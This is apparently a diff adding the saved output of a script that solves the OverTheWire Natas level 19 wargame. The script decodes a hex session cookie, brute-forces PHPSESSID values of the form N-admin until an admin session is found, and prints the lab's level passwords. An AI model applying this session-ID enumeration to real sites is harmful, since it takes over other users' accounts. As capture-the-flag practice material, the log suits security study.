@@ -1,0 +1,75 @@
+# output.
+
+[*] Status Code: 200
+[*] Cookie PHPSESSID value: 38392d61646d696e
+[*] Decoding the cookie value [38392d61646d696e] to ASCII.
+
+
+
+[*] Decoded cookie value: 89-admin
+[-] Trying PHPSESSID = 0-admin
+[-] Trying PHPSESSID = 1-admin
+[-] Trying PHPSESSID = 2-admin
+[-] Trying PHPSESSID = 3-admin
+[-] Trying PHPSESSID = 4-admin
+[-] Trying PHPSESSID = 5-admin
+[-] Trying PHPSESSID = 6-admin
+[-] Trying PHPSESSID = 7-admin
+[-] Trying PHPSESSID = 8-admin
+[-] Trying PHPSESSID = 9-admin
+...
+...
+[-] Trying PHPSESSID = 104-admin
+[-] Trying PHPSESSID = 105-admin
+[-] Trying PHPSESSID = 106-admin
+[-] Trying PHPSESSID = 107-admin
+[-] Trying PHPSESSID = 108-admin
+[-] Trying PHPSESSID = 109-admin
+[-] Trying PHPSESSID = 110-admin
+...
+...
+[-] Trying PHPSESSID = 218-admin
+[-] Trying PHPSESSID = 219-admin
+[-] Trying PHPSESSID = 220-admin
+[-] Trying PHPSESSID = 221-admin
+[-] Trying PHPSESSID = 222-admin
+...
+...
+[-] Trying PHPSESSID = 272-admin
+[-] Trying PHPSESSID = 273-admin
+[-] Trying PHPSESSID = 274-admin
+[-] Trying PHPSESSID = 275-admin
+[-] Trying PHPSESSID = 276-admin
+[-] Trying PHPSESSID = 277-admin
+[-] Trying PHPSESSID = 278-admin
+[-] Trying PHPSESSID = 279-admin
+[-] Trying PHPSESSID = 280-admin
+[-] Trying PHPSESSID = 281-admin
+[*] You are logged in as admin.
+[*] Response: 
+<html>
+<head>
+<!-- This stuff in the header has nothing to do with the level -->
+<link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
+<link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
+<script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
+<script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
+<script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
+<script>var wechallinfo = { "level": "natas19", "pass": "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs" };</script></head>
+<body>
+<h1>natas19</h1>
+<div id="content">
+<p>
+<b>
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+</b>
+</p>
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+</body> 
+</html>
+
+----------------------------------------
+The password for natas20 is eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF
+
